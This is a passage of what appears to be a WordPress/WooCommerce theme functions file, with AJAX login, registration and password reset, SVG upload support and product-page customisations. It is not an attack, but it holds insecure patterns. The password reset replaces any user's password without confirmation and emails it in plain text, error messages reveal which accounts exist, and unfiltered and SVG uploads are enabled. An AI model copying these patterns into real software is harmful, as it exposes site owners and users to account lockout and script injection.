			echo json_encode(array('loggedin'=>false, 'message'=>__($user_register->get_error_message('empty_user_login'))));
		elseif(in_array('existing_user_login',$error))
			echo json_encode(array('loggedin'=>false, 'message'=>__('This username is already registered.')));
		elseif(in_array('existing_user_email',$error))
        echo json_encode(array('loggedin'=>false, 'message'=>__('This email address is already registered.')));
    } else {
	  auth_user_login($info['nickname'], $info['user_pass'], 'Registration');       
    }

    die();
}

function auth_user_login($user_login, $password, $login)
{
	$info = array();
    $info['user_login'] = $user_login;
    $info['user_password'] = $password;
    $info['remember'] = true;
	
	//From false to '' since v4.9
	$user_signon = wp_signon( $info, '' );
    if ( is_wp_error($user_signon) ){
		echo json_encode(array('loggedin'=>false, 'message'=>__('Wrong username or password.')));
    } else {
		wp_set_current_user($user_signon->ID); 
        echo json_encode(array('loggedin'=>true, 'message'=>__($login.' successful, redirecting...')));
    }
	
	die();
}

function ajax_forgotPassword(){
	 
	// First check the nonce, if it fails the function will break
    check_ajax_referer( 'ajax-forgot-nonce', 'security' );
	
	global $wpdb;
	
	$account = $_POST['user_login'];
	
	if( empty( $account ) ) {
		$error = 'Enter an username or e-mail address.';
	} else {
		if(is_email( $account )) {
			if( email_exists($account) ) 
				$get_by = 'email';
			else	
				$error = 'There is no user registered with that email address.';			
		}
		else if (validate_username( $account )) {
			if( username_exists($account) ) 
				$get_by = 'login';
			else	
				$error = 'There is no user registered with that username.';				
		}
		else
			$error = 'Invalid username or e-mail address.';		
	}	
	
	if(empty ($error)) {
		// lets generate our new password
		//$random_password = wp_generate_password( 12, false );
		$random_password = wp_generate_password();

			
		// Get user data by field and data, fields are id, slug, email and login
		$user = get_user_by( $get_by, $account );
			
		$update_user = wp_update_user( array ( 'ID' => $user->ID, 'user_pass' => $random_password ) );
			
		// if  update user return true then lets send user an email containing the new password
		if( $update_user ) {
			
			$from = 'WRITE SENDER EMAIL ADDRESS HERE'; // Set whatever you want like mail@yourdomain.com
			
			if(!(isset($from) && is_email($from))) {		
				$sitename = strtolower( $_SERVER['SERVER_NAME'] );
				if ( substr( $sitename, 0, 4 ) == 'www.' ) {
					$sitename = substr( $sitename, 4 );					
				}
				$from = 'admin@'.$sitename; 
			}
			
			$to = $user->user_email;
			$subject = 'Your new password';
			$sender = 'From: '.get_option('name').' <'.$from.'>' . "\r\n";
			
			$message = 'Your new password is: '.$random_password;
				
			$headers[] = 'MIME-Version: 1.0' . "\r\n";
			$headers[] = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
			$headers[] = "X-Mailer: PHP \r\n";
			$headers[] = $sender;
				
			$mail = wp_mail( $to, $subject, $message, $headers );
			if( $mail ) 
				$success = 'Check your email address for you new password.';
			else
				$error = 'System is unable to send you mail containg your new password.';						
		} else {
			$error = 'Oops! Something went wrong while updaing your account.';
		}
	}
	
	if( ! empty( $error ) )
		//echo '<div class="error_login"><strong>ERROR:</strong> '. $error .'</div>';
		echo json_encode(array('loggedin'=>false, 'message'=>__($error)));
			
	if( ! empty( $success ) )
		//echo '<div class="updated"> '. $success .'</div>';
		echo json_encode(array('loggedin'=>false, 'message'=>__($success)));
				
	die();
}


add_action('wp_logout','ps_redirect_after_logout');
function ps_redirect_after_logout(){
         wp_redirect( home_url() );
         exit();
}




//add SVG to allowed file uploads
define( 'ALLOW_UNFILTERED_UPLOADS', true );


/**
 * Add svg MIME type support
 *
 * @param $mimes
 *
 * @author fb
 * @return mixed
 */
function fb_mime_types( $mimes ) {
	$mimes['svg'] = 'image/svg+xml';

	return $mimes;
}

add_filter( 'upload_mimes', 'fb_mime_types' );

/**
 * Enqueue SVG javascript and stylesheet in admin
 * @author fb
 */

function fb_svg_enqueue_scripts( $hook ) {
	wp_enqueue_script( 'fb-svg-script', get_theme_file_uri( '/js/svg.js' ), 'jquery' );
	wp_localize_script( 'fb-svg-script', 'script_vars',
		array( 'AJAXurl' => admin_url( 'admin-ajax.php' ) ) );
}

add_action( 'admin_enqueue_scripts', 'fb_svg_enqueue_scripts' );


/**
 * Ajax get_attachment_url_media_library
 * @author fb
 */
function fb_get_attachment_url_media_library() {

	$url          = '';
	$attachmentID = isset( $_REQUEST['attachmentID'] ) ? $_REQUEST['attachmentID'] : '';
	if ( $attachmentID ) {
		$url = wp_get_attachment_url( $attachmentID );
	}

	echo $url;

	die();
}

add_action( 'wp_ajax_svg_get_attachment_url', 'fb_get_attachment_url_media_library' );



function single_product_sold_by() {
        global $product;
        $seller = get_post_field( 'post_author', $product->get_id());
			$author     = get_user_by( 'id', $seller );

        $store_info = dokan_get_store_info( $author->ID );
        if ( !empty( $store_info['store_name'] ) ) { ?>
        	<div class="sold-by"> 
        		<span class="sold-by-label">Sold By : </span> 
                 <?php printf( '<a href="%s">%s</a>', dokan_get_store_url( $author->ID ), $store_info['store_name']); ?>
                </div>
        <?php 
    }
   } 
add_action( 'woocommerce_single_product_summary', 'single_product_sold_by', 10 );


remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price' );

add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 15 );


// Adding a custom Meta container to admin products pages
add_action( 'add_meta_boxes', 'create_custom_meta_box' );
if ( ! function_exists( 'create_custom_meta_box' ) )
{
    function create_custom_meta_box()
    {
        add_meta_box(
            'custom_product_meta_box',
            __( 'Product Services Information', 'cmb' ),
            'add_custom_content_meta_box',
            'product',
            'normal',
            'default'
        );
    }
}

//  Custom metabox content in admin product pages
if ( ! function_exists( 'add_custom_content_meta_box' ) ){
    function add_custom_content_meta_box( $post ){
        $prefix = '_fb_'; // global $prefix;

        $services = get_post_meta($post->ID, $prefix.'services_fb', true) ? get_post_meta($post->ID, $prefix.'services_fb', true) : '';
        $args['textarea_rows'] = 6;

        wp_editor( $services, 'services_fb', $args );
        echo '<input type="hidden" name="custom_product_field_nonce" value="' . wp_create_nonce() . '">';
    }
}



//Save the data of the Meta field
add_action( 'save_post', 'save_custom_content_meta_box', 10, 1 );
if ( ! function_exists( 'save_custom_content_meta_box' ) )
{

    function save_custom_content_meta_box( $post_id ) {
        $prefix = '_fb_'; // global $prefix;

        // We need to verify this with the proper authorization (security stuff).

        // Check if our nonce is set.
        if ( ! isset( $_POST[ 'custom_product_field_nonce' ] ) ) {
            return $post_id;
        }
        $nonce = $_REQUEST[ 'custom_product_field_nonce' ];

        //Verify that the nonce is valid.
        if ( ! wp_verify_nonce( $nonce ) ) {
            return $post_id;
        }

        // If this is an autosave, our form has not been submitted, so we don't want to do anything.
        if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
            return $post_id;
        }

        // Check the user's permissions.
        if ( 'product' == $_POST[ 'post_type' ] ){
            if ( ! current_user_can( 'edit_product', $post_id ) )
                return $post_id;
        } else {
            if ( ! current_user_can( 'edit_post', $post_id ) )
                return $post_id;
        }

        // Sanitize user input and update the meta field in the database.
        update_post_meta( $post_id, $prefix.'services_fb', wp_kses_post($_POST[ 'services_fb' ]) );
    }
}


// Add content to custom tab in product single pages (1)
function services_product_tab_content() {
    global $post;

    $product_services = get_post_meta( $post->ID, '_fb_services_fb', true );

    if ( ! empty( $product_services ) ) {
    	?>
    	<div class="product-services"> 
    		<?php
        echo apply_filters( 'the_content', $product_services );
        ?>
    </div>
        <?php
    }
}

add_action( 'woocommerce_single_product_summary', 'services_product_tab_content', 19 );


//short code to get the woocommerce recently viewed products
function custom_track_product_view() {
	if ( ! is_singular( 'product' ) ) {
		return;
	}
	global $post;
	if ( empty( $_COOKIE['woocommerce_recently_viewed'] ) )
		$viewed_products = array();
	else
		$viewed_products = (array) explode( '|', $_COOKIE['woocommerce_recently_viewed'] );
	if ( ! in_array( $post->ID, $viewed_products ) ) {
		$viewed_products[] = $post->ID;
	}
	if ( sizeof( $viewed_products ) > 15 ) {
		array_shift( $viewed_products );
	}
// Store for session only
	wc_setcookie( 'woocommerce_recently_viewed', implode( '|', $viewed_products ) );
}
add_action( 'template_redirect', 'custom_track_product_view', 20 );



function rc_woocommerce_recently_viewed_products( $atts, $content = null ) {
// Get shortcode parameters
	extract(shortcode_atts(array(
		"per_page" => '5'
	), $atts));
// Get WooCommerce Global
	global $woocommerce;
// Get recently viewed product cookies data
	$viewed_products = ! empty( $_COOKIE['woocommerce_recently_viewed'] ) ? (array) explode( '|', $_COOKIE['woocommerce_recently_viewed'] ) : array();
	$viewed_products = array_filter( array_map( 'absint', $viewed_products ) );
// If no data, quit
	if ( empty( $viewed_products ) )
		return __( 'You have not viewed any product yet!', 'rc_wc_rvp' );
// Create the object
	ob_start();
// Create query arguments array
		$query_args = array(	
			'no_found_rows'  => 1,
			'post_status'    => 'publish',
			'post_type'      => 'product',
			'post__in'       => $viewed_products,
		);
// Add meta_query to query args
	$query_args['meta_query'] = array();
// Check products stock status
	$query_args['meta_query'][] = $woocommerce->query->stock_status_meta_query();
// Create a new query
	$r = new WP_Query($query_args);
	
	while ( $r->have_posts() ) : $r->the_post(); 
		$url= wp_get_attachment_url( get_post_thumbnail_id($post->ID) );
		?>

		<!-- //put your theme html loop hare -->
		<?php woocommerce_get_template_part('content', 'product'); ?>  
		<!-- end html loop  -->
	<?php endwhile; ?>



	<?php wp_reset_postdata();


	return '<section class="recently_viewed products"><h2>Recently Viewed</h2><ul class="products columns-4">' . ob_get_clean() . '</ul></section>';
// ----
// Get clean object
	$content .= ob_get_clean();
// Return whole content
	return $content;
}
// Register the shortcode
add_shortcode("woocommerce_recently_viewed_products", "rc_woocommerce_recently_viewed_products");


function recently_viewed_products() {
	echo do_shortcode("[woocommerce_recently_viewed_products]"); 
} 

add_action( 'woocommerce_after_single_product_summary', 'recently_viewed_products', 25 );



// Disable Seller More Products Tab
add_filter( 'woocommerce_product_tabs', 'wcs_woo_remove_more_seller_product_tab', 98 );
    function wcs_woo_remove_more_seller_product_tab($tabs) {
    unset($tabs['more_seller_product']);
    return $tabs;
}

